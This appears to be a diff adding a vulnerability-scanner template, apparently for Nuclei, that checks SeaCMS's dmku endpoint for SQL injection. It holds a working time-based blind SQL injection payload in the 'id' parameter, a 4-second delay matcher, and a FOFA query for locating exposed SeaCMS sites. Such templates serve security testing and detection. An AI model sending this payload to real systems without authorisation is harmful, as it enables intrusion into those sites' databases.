@@ -1,0 +1,26 @@
+http:
+- matchers:
+  - condition: and
+    dsl:
+    - duration>=4
+    - status_code == 200
+    type: dsl
+  raw:
+  - '@timeout: 10s
+
+    GET /js/player/dmplayer/dmku/?ac=del&id=(select(0)from(select(sleep(4)))v)&type=list
+    HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+id: seacms-dmku-sqli
+info:
+  author: Co5mos
+  description: "SeaCMS \u6D77\u6D0B\u5F71\u89C6\u7BA1\u7406\u7CFB\u7EDF dmku \u5B58\
+    \u5728 SQL \u6CE8\u5165\u6F0F\u6D1E\u3002"
+  metadata:
+    fofa_query: "app=\"\u6D77\u6D0BCMS\""
+  name: SeaCMS DMKU - SQL Injection
+  severity: high
+  tags: seacms,sqli
